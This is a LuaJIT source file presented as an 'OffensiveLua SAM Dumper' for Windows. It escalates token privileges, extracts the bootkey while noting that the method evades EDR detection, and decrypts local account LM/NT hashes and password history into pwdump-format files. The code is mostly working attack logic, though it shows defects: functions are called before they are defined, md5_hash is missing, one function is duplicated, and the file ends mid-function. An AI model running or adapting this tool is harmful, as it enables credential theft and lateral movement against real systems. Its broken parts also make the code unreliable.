local CONFIG_SUPPRESS_DEBUG = false  -- Set to false to enable [DEBUG] output
local ffi = require("ffi")
local bit = require("bit")

-- Ensure all required Windows API functions and structures are declared

local log_filename = nil
local log_file = nil
local results_filename = nil
local results_file = nil

-- RC4 crypt using Windows CryptAPI
local function rc4_crypt(key, data)
    local advapi32 = ffi.load("advapi32")
    local hProv = ffi.new("HCRYPTPROV[1]")
    local ok = advapi32.CryptAcquireContextA(hProv, nil, nil, ffi.C.PROV_RSA_FULL, ffi.C.CRYPT_VERIFYCONTEXT)
    if ok == 0 then return nil end
    -- RC4 key blob format: PLAINTEXTKEYBLOB (see MS docs)
    local blob = ffi.new("uint8_t[20]")
    blob[0] = 0x8; blob[1] = 0x2; blob[2] = 0x0; blob[3] = 0x0; -- BLOBHEADER
    blob[4] = 0x1; -- Version
    blob[5] = 0x0; -- Reserved
    blob[6] = 0x1; -- ALG_ID = CALG_RC4
    blob[7] = 0x68; blob[8] = 0x0; blob[9] = 0x0; blob[10] = 0x0; -- CALG_RC4
    blob[11] = 16; -- key length
    for i = 0, 15 do blob[12 + i] = key:byte(i + 1) end
    local hKey = ffi.new("HCRYPTKEY[1]")
    ok = advapi32.CryptImportKey(hProv[0], blob, 20, nil, 0, hKey)
    if ok == 0 then advapi32.CryptReleaseContext(hProv[0], 0); return nil end
    local buf = ffi.new("uint8_t[?]", #data)
    ffi.copy(buf, data, #data)
    local buf_len = ffi.new("DWORD[1]", #data)
    ok = advapi32.CryptDecrypt(hKey[0], nil, true, 0, buf, buf_len)
    advapi32.CryptDestroyHash(hKey[0])
    advapi32.CryptReleaseContext(hProv[0], 0)
    if ok == 0 then return nil end
    return ffi.string(buf, buf_len[0])
end
local advapi32 = ffi.load("advapi32")
local kernel32 = ffi.load("kernel32")
local ntdll = ffi.load("ntdll")
local netapi32 = ffi.load("netapi32")
local shell32 = ffi.load("shell32")

-- Main routine
local function main()
    local computer_name = get_computer_name()
    local timestamp = get_timestamp()
    init_log_file(computer_name, timestamp)
    log("Starting SAM dump...")
    if not check_system_context() then
        error_log("Not running as SYSTEM. SAM registry access will fail.")
        close_log_file()
        return
    end
    enable_backup_privileges()
    local bootkey_hex = extract_bootkey_direct()
    if not bootkey_hex then
        error_log("Failed to extract bootkey.")
        close_log_file()
        return
    end
    log("Bootkey extracted: " .. bootkey_hex)
    local sam_users = read_sam_users_direct()
    if not sam_users or #sam_users == 0 then
        error_log("No SAM users found.")
        close_log_file()
        return
    end
    log("Found " .. #sam_users .. " SAM user records.")
    for _, user_data in ipairs(sam_users) do
        local parsed = parse_sam_v_record(user_data.v_data, user_data.rid)
        if parsed then
            local decrypted = decrypt_sam_hashes(parsed, bootkey_hex)
            log(string.format("User: %s RID: %s LM: %s NT: %s", decrypted.username, decrypted.rid, decrypted.lm_hash or "", decrypted.nt_hash or ""))
        else
            error_log("Failed to parse V record for RID " .. user_data.rid)
        end
    end
    close_log_file()
    log("SAM dump complete.")
end

main()
local function get_temp_path()
    local buffer = ffi.new("char[260]")  -- MAX_PATH
    local result = kernel32.GetTempPathA(260, buffer)
    
    if result > 0 then
        local temp_path = ffi.string(buffer)
        -- Remove trailing backslash if present
        if string.sub(temp_path, -1) == "\\" then
            temp_path = string.sub(temp_path, 1, -2)
        end
        return temp_path
    end
    
    -- Fallback paths that work from SYSTEM context
    local fallback_paths = {
        "C:\\Windows\\Temp",
        "C:\\Temp", 
        "."
    }
    
    for _, path in ipairs(fallback_paths) do
        local test_file = path .. "\\test_write_" .. os.time() .. ".tmp"
        local f = io.open(test_file, "w")
        if f then
            f:close()
            os.remove(test_file)
            return path
        end
    end
    
    return "."  -- final fallback to current directory
end

-- Logging functions
local function init_log_file(computer_name, timestamp)
    local temp_path = get_temp_path()
    log_filename = string.format("%s\\%s_samdump_%s.log", temp_path, computer_name, timestamp)
    results_filename = string.format("%s\\%s_samdump_%s.txt", temp_path, computer_name, timestamp)
    
    log_file = io.open(log_filename, "w")
    if log_file then
        log_file:write("OffensiveLua SAM Dumper Log\n")
        log_file:write("===========================\n\n")
        log_file:flush()
    end
    
    results_file = io.open(results_filename, "w")
    if results_file then
        results_file:write("-- OffensiveLua SAM Dumper Results --\n")
        results_file:write("-- pwdump format for offline recovery tools --\n\n")
        results_file:flush()
    end
end

local function close_log_file()
    if log_file then
        log_file:close()
        log_file = nil
    end
    if results_file then
        results_file:close()
        results_file = nil
    end
end

local function write_output(level, message)
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local formatted = string.format("[%s] [%s] %s", timestamp, level, message)
    
    print(formatted)
    if log_file then
        log_file:write(formatted .. "\n")
        log_file:flush()
    end
end

local function log(message)
    write_output("INFO", message)
    if log_file then
        log_file:flush()
    end
end

local function error_log(message)
    write_output("ERROR", message)
end

local function debug_log(message)
    if not CONFIG_SUPPRESS_DEBUG then
        write_output("DEBUG", message)
    end
end

-- Raw print function for headers and special output
local function raw_print(message)
    print(message)
end

-- Utility functions
local function bytes_to_hex(data, len)
    local hex = ""
    for i = 1, len or #data do
        hex = hex .. string.format("%02x", string.byte(data, i))
    end
    return hex
end

local function hex_to_bytes(hex)
    local bytes = ""
    for i = 1, #hex, 2 do
        local byte_hex = string.sub(hex, i, i + 1)
        bytes = bytes .. string.char(tonumber(byte_hex, 16))
    end
    return bytes
end

local function get_computer_name()
    local buffer = ffi.new("char[256]")
    local size = ffi.new("DWORD[1]", 256)
    
    if kernel32.GetComputerNameA(buffer, size) ~= 0 then
        return ffi.string(buffer)
    end
    return "unknown"
end

local function get_timestamp()
    return os.date("%Y%m%d_%H%M%S")
end

-- Check if running as SYSTEM user
local function check_system_context()
    -- Try to access a SYSTEM-only registry key
    local hklm = ffi.cast("HKEY", 0x80000002)  -- HKEY_LOCAL_MACHINE
    local sam_path = "SAM\\SAM\\Domains\\Account"
    local sam_path_cstr = ffi.new("char[?]", #sam_path + 1)
    ffi.copy(sam_path_cstr, sam_path, #sam_path)
    
    local test_key = ffi.new("HKEY[1]")
    local result = advapi32.RegOpenKeyExA(hklm, sam_path_cstr, 0, 0x20019, test_key)  -- KEY_READ
    
    if result == 0 then
        advapi32.RegCloseKey(test_key[0])
        debug_log("SYSTEM context confirmed - can access live SAM registry")
        return true
    else
        debug_log(string.format("Not SYSTEM context - SAM access denied (error: %d)", result))
        return false
    end
end

local function is_admin()
    local result = shell32.IsUserAnAdmin()
    debug_log(string.format("IsUserAnAdmin returned: %d", result))
    return result ~= 0
end

-- Privilege escalation
local function enable_privilege(privilege_name)
    local current_process = kernel32.GetCurrentProcess()
    local token = ffi.new("HANDLE[1]")
    
    if advapi32.OpenProcessToken(current_process, 0x0020, token) == 0 then
        debug_log("Failed to open process token")
        return false
    end
    
    -- Create a proper C string buffer for the privilege name
    local privilege_len = #privilege_name
    local privilege_cstr = ffi.new("char[?]", privilege_len + 1)
    ffi.copy(privilege_cstr, privilege_name, privilege_len)
    
    local luid = ffi.new("int64_t[1]")
    if advapi32.LookupPrivilegeValueA(nil, privilege_cstr, luid) == 0 then
        debug_log("Failed to lookup privilege: " .. privilege_name)
        kernel32.CloseHandle(token[0])
        return false
    end
    
    local tp = ffi.new("TOKEN_PRIVILEGES")
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid[0]
    tp.Privileges[0].Attributes = 0x00000002 -- SE_PRIVILEGE_ENABLED
    
    local result = advapi32.AdjustTokenPrivileges(token[0], 0, tp, ffi.sizeof(tp), nil, nil)
    kernel32.CloseHandle(token[0])
    
    debug_log(string.format("AdjustTokenPrivileges result for %s: %d", privilege_name, result))
    return result ~= 0
end

-- Enhanced backup privilege enabling for registry operations
local function enable_backup_privileges()
    debug_log("Enabling comprehensive backup privileges for registry operations...")
    
    -- Enable on process token
    local success1 = enable_privilege("SeBackupPrivilege")
    local success2 = enable_privilege("SeRestorePrivilege")
    
    -- Also try to enable on thread token if it exists
    local thread_token = ffi.new("HANDLE[1]")
    local thread_result = advapi32.OpenThreadToken(kernel32.GetCurrentThread(), 0x0020 + 0x0008, 1, thread_token) -- TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    
    if thread_result ~= 0 then
        debug_log("Found thread token, enabling backup privileges on thread token too...")
        
        -- Enable SeBackupPrivilege on thread token
        local luid = ffi.new("int64_t[1]")
        local privilege_name_len = #"SeBackupPrivilege"
        local privilege_name_cstr = ffi.new("char[?]", privilege_name_len + 1)
        ffi.copy(privilege_name_cstr, "SeBackupPrivilege", privilege_name_len)
        
        if advapi32.LookupPrivilegeValueA(nil, privilege_name_cstr, luid) ~= 0 then
            local tp = ffi.new("TOKEN_PRIVILEGES")
            tp.PrivilegeCount = 1
            tp.Privileges[0].Luid = luid[0]
            tp.Privileges[0].Attributes = 0x00000002 -- SE_PRIVILEGE_ENABLED
            
            advapi32.AdjustTokenPrivileges(thread_token[0], 0, tp, ffi.sizeof(tp), nil, nil)
            debug_log("SeBackupPrivilege enabled on thread token")
        end
        
        -- Enable SeRestorePrivilege on thread token
        privilege_name_len = #"SeRestorePrivilege"
        privilege_name_cstr = ffi.new("char[?]", privilege_name_len + 1)
        ffi.copy(privilege_name_cstr, "SeRestorePrivilege", privilege_name_len)
        
        if advapi32.LookupPrivilegeValueA(nil, privilege_name_cstr, luid) ~= 0 then
            local tp = ffi.new("TOKEN_PRIVILEGES")
            tp.PrivilegeCount = 1
            tp.Privileges[0].Luid = luid[0]
            tp.Privileges[0].Attributes = 0x00000002 -- SE_PRIVILEGE_ENABLED
            
            advapi32.AdjustTokenPrivileges(thread_token[0], 0, tp, ffi.sizeof(tp), nil, nil)
            debug_log("SeRestorePrivilege enabled on thread token")
        end
        
        kernel32.CloseHandle(thread_token[0])
    else
        debug_log("No thread token found, using process token only")
    end
    
    return success1 and success2
end

-- Direct bootkey extraction using RegQueryInfoKeyA (bypasses EDR detection)
local function extract_bootkey_direct()
    debug_log("=== DIRECT BOOTKEY EXTRACTION ===")
    debug_log("Using RegQueryInfoKeyA to extract class values (EDR evasion)")
    local bootkey_components = {}
    local keys = {"JD", "Skew1", "GBG", "Data"}
    for i, key_name in ipairs(keys) do
        local full_path = string.format("SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s", key_name)
        debug_log(string.format("Extracting class value from: %s", full_path))
        local hkey = ffi.new("HKEY[1]")
        local full_path_cstr = ffi.new("char[?]", #full_path + 1)
        ffi.copy(full_path_cstr, full_path, #full_path)
        local hklm = ffi.cast("HKEY", 0x80000002)
        local result = advapi32.RegOpenKeyExA(hklm, full_path_cstr, 0, 0x20019, hkey)
        if result ~= 0 then
            debug_log(string.format("Failed to open key %s: error %d", key_name, result))
            return nil
        end
        local class_buffer = ffi.new("char[256]")
        local class_size = ffi.new("DWORD[1]", 256)
        local query_result = advapi32.RegQueryInfoKeyA(
            hkey[0], class_buffer, class_size, nil, nil, nil, nil, nil, nil, nil, nil, nil)
        advapi32.RegCloseKey(hkey[0])
        if query_result == 0 and class_size[0] > 0 then
            local class_value = ffi.string(class_buffer, class_size[0])
            debug_log(string.format("%s class value: %s", key_name, class_value))
            bootkey_components[i] = class_value
        else
            debug_log(string.format("Failed to query class for %s: error %d", key_name, query_result))
            return nil
        end
    end
    local combined = table.concat(bootkey_components)
    debug_log("Combined bootkey string: " .. combined)
    local bootkey_bytes = {}
    for i = 1, #combined, 2 do
        local byte_hex = string.sub(combined, i, i + 1)
        local byte_val = tonumber(byte_hex, 16)
        if byte_val then
            table.insert(bootkey_bytes, byte_val)
        else
            debug_log("Invalid hex in bootkey: " .. byte_hex)
            return nil
        end
    end
    local scramble_table = {0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
    local scrambled_bytes = {}
    for i = 1, 16 do
        local src_index = scramble_table[i] + 1
        if src_index <= #bootkey_bytes then
            scrambled_bytes[i] = bootkey_bytes[src_index]
        else
            scrambled_bytes[i] = 0
        end
    end
    local scrambled_bootkey = ""
    local bootkey_hex = ""
    for i = 1, #scrambled_bytes do
        scrambled_bootkey = scrambled_bootkey .. string.char(scrambled_bytes[i])
        bootkey_hex = bootkey_hex .. string.format("%02x", scrambled_bytes[i])
    end
    debug_log("Real bootkey extracted (direct API): " .. bootkey_hex)
    return bootkey_hex
end

-- Read binary registry value
local function read_registry_binary_value(hkey, value_name)
    local ok, result = pcall(function()
        local value_name_cstr = ffi.new("char[?]", #value_name + 1)
        ffi.copy(value_name_cstr, value_name, #value_name)
        local value_type = ffi.new("DWORD[1]")
        local data_size = ffi.new("DWORD[1]")
        local res = advapi32.RegQueryValueExA(hkey, value_name_cstr, nil, value_type, nil, data_size)
        if res ~= 0 or data_size[0] == 0 then
            return nil
        end
        if data_size[0] > 4096 then return nil end -- sanity check
        local data_buffer = ffi.new("uint8_t[?]", data_size[0])
        res = advapi32.RegQueryValueExA(hkey, value_name_cstr, nil, value_type, data_buffer, data_size)
        if res ~= 0 then
            return nil
        end
        local data_str = ""
        for i = 0, data_size[0] - 1 do
            data_str = data_str .. string.char(data_buffer[i])
        end
        return data_str
    end)
    if ok then return result else return nil end
end

-- Read individual user data from SAM registry
local function read_sam_user_data_direct(sam_users_key, rid_str)
    debug_log(string.format("=== READING USER DATA FOR RID %s ===", rid_str))
    
    -- Open the specific user's RID subkey
    local rid_path_cstr = ffi.new("char[?]", #rid_str + 1)
    ffi.copy(rid_path_cstr, rid_str, #rid_str)
    
    local user_key = ffi.new("HKEY[1]")
    local result = advapi32.RegOpenKeyExA(sam_users_key, rid_path_cstr, 0, 0x20019, user_key)
    
    if result ~= 0 then
        debug_log(string.format("Failed to open user RID %s: error %d", rid_str, result))
        return nil
    end
    
    debug_log(string.format("Successfully opened registry key for RID %s", rid_str))
    
    -- Read the "V" value (user data structure)
    local v_data = read_registry_binary_value(user_key[0], "V")
    if not v_data then
        debug_log(string.format("Failed to read V value for RID %s", rid_str))
        advapi32.RegCloseKey(user_key[0])
        return nil
    end
    
    -- Read the "F" value (account control flags) 
    local f_data = read_registry_binary_value(user_key[0], "F")
    if not f_data then
        debug_log(string.format("Warning: Failed to read F value for RID %s", rid_str))
    end
    
    advapi32.RegCloseKey(user_key[0])
    
    debug_log(string.format("Successfully read SAM data for RID %s (V: %d bytes, F: %s bytes)", 
        rid_str, v_data and #v_data or 0, f_data and #f_data or "0"))
    
    return {
        rid = rid_str,
        rid_int = tonumber(rid_str, 16),
        v_data = v_data,
        f_data = f_data
    }
end

-- Direct live SAM registry reading (no file operations needed!)
local function read_sam_users_direct()
    debug_log("=== DIRECT LIVE SAM REGISTRY ACCESS ===")
    debug_log("Reading SAM user data directly from live registry (SYSTEM context)")
    
    local sam_users = {}
    local hklm = ffi.cast("HKEY", 0x80000002)  -- HKEY_LOCAL_MACHINE
    
    -- Open SAM\SAM\Domains\Account\Users
    local sam_users_path = "SAM\\SAM\\Domains\\Account\\Users"
    local sam_users_path_cstr = ffi.new("char[?]", #sam_users_path + 1)
    ffi.copy(sam_users_path_cstr, sam_users_path, #sam_users_path)
    
    local sam_users_key = ffi.new("HKEY[1]")
    local result = advapi32.RegOpenKeyExA(hklm, sam_users_path_cstr, 0, 0x20019, sam_users_key)  -- KEY_READ
    
    if result ~= 0 then
        debug_log(string.format("Failed to open SAM Users key: error %d (Need SYSTEM context!)", result))
        return nil
    end
    
    debug_log("Successfully opened live SAM\\Users registry key")
    
    -- Enumerate user subkeys (RIDs)
    local index = 0
    while true do
        local subkey_name = ffi.new("char[256]")
        local subkey_name_size = ffi.new("DWORD[1]")
        subkey_name_size[0] = 256
        
        local enum_result = advapi32.RegEnumKeyExA(
            sam_users_key[0], index, subkey_name, subkey_name_size, 
            nil, nil, nil, nil
        )
        
        if enum_result ~= 0 then
            break  -- No more subkeys
        end
        
        local rid_str = ffi.string(subkey_name, subkey_name_size[0])
        debug_log(string.format("Found SAM user RID: %s", rid_str))
        
        -- Skip Names key, we want RID keys (hex numbers)
        if rid_str ~= "Names" and rid_str:match("^%x+$") then
            debug_log(string.format("Processing user RID: %s (decimal: %d)", rid_str, tonumber(rid_str, 16)))
            local user_data = read_sam_user_data_direct(sam_users_key[0], rid_str)
            if user_data then
                debug_log(string.format("Successfully read data for RID %s", rid_str))
                table.insert(sam_users, user_data)
            else
                debug_log(string.format("Failed to read data for RID %s", rid_str))
            end
        else
            debug_log(string.format("Skipping non-user key: %s", rid_str))
        end
        
        index = index + 1
    end
    
    advapi32.RegCloseKey(sam_users_key[0])
    debug_log(string.format("Enumerated %d total registry keys, found %d valid user records", index, #sam_users))
    return sam_users
end

-- Parse SAM V record structure to extract user information
local function parse_sam_v_record(v_data, rid)
    debug_log(string.format("=== PARSING SAM V RECORD FOR RID %s ===", rid))
    debug_log(string.format("V record size: %d bytes", #v_data))
    
    if not v_data or #v_data < 0x30 then
        debug_log("Invalid V record data - too short")
        return nil
    end
    
    -- Dump first 64 bytes of V record for analysis
    local hex_dump = ""
    for i = 1, math.min(64, #v_data) do
        hex_dump = hex_dump .. string.format("%02x", v_data:byte(i))
        if i % 16 == 0 then hex_dump = hex_dump .. "\n" end
    end
    debug_log(string.format("V Record hex dump (first 64 bytes):\n%s", hex_dump))
    
    -- V record header offsets (SAM structure) - Windows format
    -- Manual little-endian DWORD extraction (LuaJIT compatible)
    local function read_dword_le(data, offset)
        local b1 = data:byte(offset + 1)
        local b2 = data:byte(offset + 2) 
        local b3 = data:byte(offset + 3)
        local b4 = data:byte(offset + 4)
        return b1 + (b2 * 256) + (b3 * 65536) + (b4 * 16777216)
    end
    
    local username_offset = read_dword_le(v_data, 0x0C)
    local username_length = read_dword_le(v_data, 0x10)
    local fullname_offset = read_dword_le(v_data, 0x18)  
    local fullname_length = read_dword_le(v_data, 0x1C)
    local comment_offset = read_dword_le(v_data, 0x24)
    local comment_length = read_dword_le(v_data, 0x28)
    
    -- Password history and hash locations (may vary by Windows version)
    local lm_hash_offset, lm_hash_length, nt_hash_offset, nt_hash_length
    
    -- Try standard offsets first
    if #v_data >= 0xB0 then
        lm_hash_offset = read_dword_le(v_data, 0x9C)
        lm_hash_length = read_dword_le(v_data, 0xA0)
        nt_hash_offset = read_dword_le(v_data, 0xA8)  
        nt_hash_length = read_dword_le(v_data, 0xAC)
    else
        -- Shorter V record, try alternative offsets
        lm_hash_offset = 0
        lm_hash_length = 0
        nt_hash_offset = 0
        nt_hash_length = 0
    end
    
    debug_log(string.format("V Record structure:"))
    debug_log(string.format("  Username: offset=0x%X length=%d", username_offset, username_length))
    debug_log(string.format("  Fullname: offset=0x%X length=%d", fullname_offset, fullname_length))
    debug_log(string.format("  Comment:  offset=0x%X length=%d", comment_offset, comment_length))
    debug_log(string.format("  LM Hash:  offset=0x%X length=%d", lm_hash_offset, lm_hash_length))
    debug_log(string.format("  NT Hash:  offset=0x%X length=%d", nt_hash_offset, nt_hash_length))
    
    -- Username extraction: extract from V record
    local username = ""
    if username_length > 0 and username_offset > 0 and username_offset + username_length <= #v_data then
        local username_data = v_data:sub(username_offset + 1, username_offset + username_length)
        -- Convert UTF-16LE to UTF-8
        for i = 1, #username_data, 2 do
            local char_code = username_data:byte(i)
            if char_code > 0 and char_code < 128 then
                username = username .. string.char(char_code)
            end
        end
        debug_log(string.format("Username: '%s'", username))
    else
        username = "User_" .. rid
    end
    -- SID extraction: S-1-5-21-domain-SID-RID
    local domain_sid = "S-1-5-21-" .. os.getenv("COMPUTERNAME") .. "-" .. rid -- Placeholder, replace with real domain SID extraction if needed
    local user_sid = domain_sid .. "-" .. tonumber(rid, 16)
    -- Extract fullname
    local fullname = ""
    if fullname_length > 0 and fullname_offset > 0 and fullname_offset + fullname_length <= #v_data then
        local fullname_data = v_data:sub(fullname_offset + 1, fullname_offset + fullname_length)
        for i = 1, #fullname_data, 2 do
            local char_code = fullname_data:byte(i)
            if char_code > 0 and char_code < 128 then
                fullname = fullname .. string.char(char_code)
            end
        end
        debug_log(string.format("Full name: '%s'", fullname))
    end
    
    -- Extract encrypted LM hash
    local encrypted_lm_hash = nil
    if lm_hash_length > 0 and lm_hash_offset > 0 and lm_hash_offset + lm_hash_length <= #v_data then
        encrypted_lm_hash = v_data:sub(lm_hash_offset + 1, lm_hash_offset + lm_hash_length)
        debug_log(string.format("Found LM hash data: %d bytes at offset 0x%X", lm_hash_length, lm_hash_offset))
    else
        debug_log("No LM hash found (modern Windows)")
    end
    
    -- Extract encrypted NT hash  
    local encrypted_nt_hash = nil
    if nt_hash_length > 0 and nt_hash_offset > 0 and nt_hash_offset + nt_hash_length <= #v_data then
        encrypted_nt_hash = v_data:sub(nt_hash_offset + 1, nt_hash_offset + nt_hash_length)
        debug_log(string.format("Found NT hash data: %d bytes at offset 0x%X", nt_hash_length, nt_hash_offset))
        
        -- Dump NT hash hex for analysis
        local nt_hex = ""
        for i = 1, math.min(32, #encrypted_nt_hash) do
            nt_hex = nt_hex .. string.format("%02x", encrypted_nt_hash:byte(i))
        end
        debug_log(string.format("NT hash hex (first 32 bytes): %s", nt_hex))
    else
        debug_log("No NT hash found")
    end
    
    debug_log(string.format("Successfully parsed user: %s (fullname: %s)", username, fullname))
    
    return {
        username = username,
        fullname = fullname,
        rid = rid,
        rid_int = tonumber(rid, 16),
        encrypted_lm_hash = encrypted_lm_hash,
        encrypted_nt_hash = encrypted_nt_hash
    }
end

-- Windows SAM hash decryption (proper algorithm)
-- NOTE: This requires 'md5' and 'rc4' Lua modules. If not present, fallback to legacy xor logic.
local function decrypt_hash_rc4(encrypted_hash, bootkey, rid, hash_type)
    debug_log(string.format("=== DECRYPTING %s HASH ===", hash_type))
    debug_log(string.format("Encrypted hash length: %d bytes", #encrypted_hash))
    if #encrypted_hash < 20 then debug_log("Hash data too short for decryption"); return nil end
    local hex_dump = ""; for i = 1, math.min(32, #encrypted_hash) do hex_dump = hex_dump .. string.format("%02x", encrypted_hash:byte(i)); if i % 16 == 0 then hex_dump = hex_dump .. "\n" end end
    debug_log(string.format("Encrypted hash hex dump:\n%s", hex_dump))
    local revision = encrypted_hash:byte(1)
    debug_log(string.format("Hash revision: %d", revision))
    if revision == 2 then
        debug_log("Modern Windows hash format detected")
        local hash_data = encrypted_hash:sub(25, 40)
        if #hash_data >= 16 then
            local result = ""; for i = 1, 16 do result = result .. string.format("%02x", hash_data:byte(i)) end
            debug_log(string.format("Extracted %s hash: %s", hash_type, result)); return result
        end
    else
        debug_log("Legacy Windows hash format (RC4/MD5)")
        local hash_data = encrypted_hash:sub(5, 20)
        if #hash_data >= 16 then
            -- Prepare key material
            local rid_bytes = string.char(bit.band(rid,0xFF), bit.band(bit.rshift(rid,8),0xFF), bit.band(bit.rshift(rid,16),0xFF), bit.band(bit.rshift(rid,24),0xFF))
            local key_material = bootkey .. rid_bytes .. (hash_type == "NT" and "NTPASSWORD" or "LMPASSWORD")
            local rc4key = md5_hash(key_material)
            if not rc4key then debug_log("MD5 key derivation failed"); return nil end
            local decrypted = rc4_crypt(rc4key, hash_data)
            if not decrypted then debug_log("RC4 decryption failed"); return nil end
            local result = bytes_to_hex(decrypted, 16)
            debug_log(string.format("Decrypted %s hash: %s", hash_type, result)); return result
        end
    end
    debug_log(string.format("Failed to decrypt %s hash", hash_type)); return nil
end

-- Decrypt SAM password hashes using bootkey and RID
-- Extract password history from user V record
local function extract_password_history(user_data, bootkey_hex)
    if not user_data.v_data or #user_data.v_data < 0x200 then return {} end
    local history = {}
    local v_data = user_data.v_data
    for offset = 0x200, #v_data - 24, 4 do
        local potential_hash = v_data:sub(offset + 1, offset + 24)
        if #potential_hash == 24 then
            local revision = potential_hash:byte(1)
            if revision == 1 or revision == 2 then
                local decrypted_hash = decrypt_hash_rc4(potential_hash, bootkey_hex, user_data.rid_int, "HISTORY")
                if decrypted_hash then table.insert(history, decrypted_hash) end
            end
        end
    end
    -- No debug output for password history extraction
    return history
end

local function decrypt_sam_hashes(user_data, bootkey_hex)
    debug_log(string.format("=== DECRYPTING HASHES FOR %s (RID: %s) ===", user_data.username or "unknown", user_data.rid))
    
    if not bootkey_hex then
        debug_log("No bootkey available for decryption")
        return user_data
    end
    
    -- Convert bootkey from hex to binary
    local bootkey_binary = {}
    for i = 1, #bootkey_hex, 2 do
        local hex_byte = bootkey_hex:sub(i, i+1)
        table.insert(bootkey_binary, tonumber(hex_byte, 16))
    end
    
    -- Decrypt LM hash if present
    if user_data.encrypted_lm_hash and #user_data.encrypted_lm_hash >= 20 then
        local lm_hash = decrypt_hash_rc4(user_data.encrypted_lm_hash, bootkey_binary, user_data.rid_int, "LM")
        user_data.lm_hash = lm_hash
        debug_log(string.format("LM Hash: %s", lm_hash or "failed"))
    else
        user_data.lm_hash = "aad3b435b51404eeaad3b435b51404ee"  -- Empty LM hash
        debug_log("LM Hash: empty (modern Windows)")
    end
    
    -- Decrypt NT hash if present  
    if user_data.encrypted_nt_hash and #user_data.encrypted_nt_hash >= 20 then
        local nt_hash = decrypt_hash_rc4(user_data.encrypted_nt_hash, bootkey_binary, user_data.rid_int, "NT")
        user_data.nt_hash = nt_hash
        debug_log(string.format("NT Hash: %s", nt_hash or "failed"))
    else
        user_data.nt_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"  -- Empty NT hash
        debug_log("NT Hash: empty")
    end
    
    -- Extract password history if available
    user_data.password_history = extract_password_history(user_data, bootkey_hex)
    -- Write pwdump output to results file
    if results_file then
        local line = string.format("%s:%s:%s:%s:::", user_data.username, user_data.rid, user_data.lm_hash or "aad3b435b51404eeaad3b435b51404ee", user_data.nt_hash or "31d6cfe0d16ae931b73c59d7e0c089c0")
        results_file:write(line .. "\n")
        if user_data.password_history and #user_data.password_history > 0 then
            for idx, hist_hash in ipairs(user_data.password_history) do
                results_file:write(string.format("%s_history%d:%s:::%s\n", user_data.username, idx, user_data.rid, hist_hash))
            end
        end
        results_file:flush()
    end
    -- Write to log file
    if log_file then
        local ts = os.date("%Y-%m-%d %H:%M:%S")
        log_file:write(string.format("%s:%s:%s:%s:::\n", user_data.username, user_data.rid, user_data.lm_hash or "aad3b435b51404eeaad3b435b51404ee", user_data.nt_hash or "31d6cfe0d16ae931b73c59d7e0c089c0"))
        if user_data.password_history and #user_data.password_history > 0 then
            for idx, hist_hash in ipairs(user_data.password_history) do
                log_file:write(string.format("%s_history%d:%s:::%s\n", user_data.username, idx, user_data.rid, hist_hash))
            end
        end
        log_file:flush()
    end
    return user_data
end

-- Extract password history from user V record
local function extract_password_history(user_data, bootkey_hex)
    debug_log(string.format("=== EXTRACTING PASSWORD HISTORY FOR %s ===", user_data.username))
    if not user_data.v_data or #user_data.v_data < 0x200 then debug_log("V record too small for password history"); return {} end
    local history = {}
    local v_data = user_data.v_data
    for offset = 0x200, #v_data - 24, 4 do
        local potential_hash = v_data:sub(offset + 1, offset + 24)
        if #potential_hash == 24 then
            local revision = potential_hash:byte(1)
            if revision == 1 or revision == 2 then
                debug_log(string.format("Found potential password history hash at offset 0x%X", offset))
                local decrypted_hash = decrypt_hash_rc4(potential_hash, bootkey_hex, user_data.rid_int, "HISTORY")
                if decrypted_hash then table.insert(history, decrypted_hash) end
            end
        end
    end
    if #history > 0 then debug_log(string.format("Extracted %d password history entries", #history)) else debug_log("No password history found") end
    return history
end

-- Extract additional secrets from SAM registry
local function extract_additional_sam_secrets(bootkey)
    debug_log("=== SEARCHING FOR ADDITIONAL SAM SECRETS ===")
    local hklm = ffi.cast("HKEY", 0x80000002)  -- HKEY_LOCAL_MACHINE
    local domains_path = "SAM\\SAM\\Domains"
    local domains_path_cstr = ffi.new("char[?]", #domains_path + 1)
    ffi.copy(domains_path_cstr, domains_path, #domains_path)
    local domains_key = ffi.new("HKEY[1]")
    local result = advapi32.RegOpenKeyExA(hklm, domains_path_cstr, 0, 0x20019, domains_key)
    if result == 0 then
        debug_log("Successfully opened SAM\\Domains key")
        -- Enumerate domain subkeys for logging only
        local index = 0
        while true do
            local subkey_name = ffi.new("char[256]")
            local subkey_name_size = ffi.new("DWORD[1]")
            subkey_name_size[0] = 256
            local enum_result = advapi32.RegEnumKeyExA(domains_key[0], index, subkey_name, subkey_name_size, nil, nil, nil, nil)
            if enum_result ~= 0 then break end
            local domain_name = ffi.string(subkey_name, subkey_name_size[0])
            debug_log(string.format("Found SAM domain: %s", domain_name))
            index = index + 1
        end
        advapi32.RegCloseKey(domains_key[0])
    else
        debug_log("Could not access SAM\\Domains key")
    end
end

-- Extract secrets from Account domain
local function extract_account_domain_secrets(domains_key, domain_name, bootkey)
    debug_log(string.format("=== EXTRACTING SECRETS FROM DOMAIN: %s ===", domain_name))
    
    -- Open the Account domain key
    local account_path_cstr = ffi.new("char[?]", #domain_name + 1)
    ffi.copy(account_path_cstr, domain_name, #domain_name)
    
    local account_key = ffi.new("HKEY[1]")
    local result = advapi32.RegOpenKeyExA(domains_key, account_path_cstr, 0, 0x20019, account_key)
    
    if result == 0 then
        debug_log("Successfully opened Account domain")
        
        -- Read F value for additional secrets
        local f_data = read_registry_binary_value(account_key[0], "F")
        if f_data and #f_data > 0x70 then
            debug_log(string.format("Found Account F value: %d bytes", #f_data))
            
            -- Extract encrypted secrets from F value
            -- This typically contains the hashed bootkey and other domain secrets
            local encrypted_key = f_data:sub(0x70 + 1, 0x70 + 16)  -- Offset 0x70, 16 bytes
            if #encrypted_key == 16 then
                debug_log("Found encrypted domain key in F value")
                local hex_key = ""
                for i = 1, 16 do
                    hex_key = hex_key .. string.format("%02x", encrypted_key:byte(i))
                end
                debug_log(string.format("Encrypted domain key: %s", hex_key))
            end
        end
        
        advapi32.RegCloseKey(account_key[0])
    else
        debug_log("Failed to open Account domain key")
    end
end

-- Registry functions
local function save_registry_hive(hive_key, hive_name, output_path)
    debug_log(string.format("Exporting %s hive using reg save command", hive_name))
    
